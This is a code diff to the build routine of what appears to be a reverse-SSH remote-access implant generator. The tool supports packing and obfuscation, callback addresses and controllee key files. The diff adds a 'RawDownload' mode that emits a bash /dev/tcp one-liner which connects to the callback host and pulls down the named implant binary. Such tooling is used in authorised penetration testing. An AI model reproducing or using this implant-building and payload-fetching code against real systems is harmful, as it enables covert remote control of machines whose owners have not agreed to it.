@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"errors"
 	"fmt"
+	"net"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -39,6 +40,9 @@ type BuildConfig struct {
 	UPX           bool
 	Garble        bool
 	DisableLibC   bool
+	RawDownload   bool
+
+	WorkingDirectory string
 }
 
 func Build(config BuildConfig) (string, error) {
@@ -75,7 +79,7 @@ func Build(config BuildConfig) (string, error) {
 	}
 
 	var f data.Download
-
+	f.WorkingDirectory = config.WorkingDirectory
 	f.CallbackAddress = config.ConnectBackAdress
 
 	filename, err := internal.RandomString(16)
@@ -235,6 +239,16 @@ func Build(config BuildConfig) (string, error) {
 
 	if _, err = authorizedControlleeKeys.WriteString(fmt.Sprintf("%s %s %s\n", "owner="+strconv.Quote(config.Owners), publicKeyBytes[:len(publicKeyBytes)-1], config.Comment)); err != nil {
 		return "", errors.New("cant write newly generated key to authorized controllee keys file: " + err.Error())
+	}
+
+	if config.RawDownload {
+
+		host, port, err := net.SplitHostPort(f.CallbackAddress)
+		if err != nil {
+			return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW%[1]s>&3; cat <&3" > %[1]s`, config.Name), nil
+		}
+
+		return fmt.Sprintf(`bash -c "exec 3<>/dev/tcp/%s/%s; echo RAW%[3]s>&3; cat <&3" > %[3]s`, host, port, config.Name), nil
 	}
 
 	return "http://" + DefaultConnectBack + "/" + config.Name, nil
